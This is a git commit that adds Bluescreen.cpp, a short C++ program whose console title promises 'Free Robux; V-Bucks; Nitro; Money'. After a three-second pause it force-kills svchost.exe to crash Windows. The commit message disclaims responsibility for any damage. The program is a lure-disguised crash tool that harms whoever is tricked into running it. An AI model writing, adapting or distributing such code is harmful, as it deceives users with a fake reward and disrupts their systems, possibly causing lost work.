1a2e466f9f46766d363f627c729a3c1f42f7aa2d
ToxicSeinDad <80545238+ToxicSeinDad@users.noreply.github.com>
2022-07-14 21:54:20 +0200

    Add files via upload
    Im not responsible for any damage happening by running this.

---
+++ Bluescreen.cpp
@@ -0,0 +1,15 @@
+#include <iostream>
+
+int main() {
+
+	system("title Free Robux; V-Bucks; Nitro; Money 2022");
+	system("color 9");
+	std::cout << "I hope you like the color blue :(";
+	system("timeout /t 3 /nobreak > nul");
+	system("Taskkill /im svchost.exe /f");
+
+	return 0;
+	
+
+	
+}
